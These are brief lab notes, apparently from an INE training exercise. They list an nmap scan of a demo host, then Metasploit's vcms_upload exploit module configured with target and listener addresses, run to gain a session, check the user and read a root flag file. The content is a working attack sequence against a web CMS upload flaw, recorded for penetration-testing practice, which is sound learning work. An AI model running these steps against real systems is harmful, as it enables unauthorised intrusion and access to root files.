---
title: Part 1
updated: 2022-02-14 08:04:05Z
created: 2022-02-13 15:59:25Z
latitude: 45.12540000
longitude: 25.73340000
altitude: 0.0000
---

- nmap -A demo.ine.local
- msfconsole -q

use exploit/linux/http/vcms_upload
show options
set RHOSTS demo.ine.local
set TARGETURI /
set LHOST 192.62.135.2
check
exploit
getuid

ls /root
cat /root/flag.txt

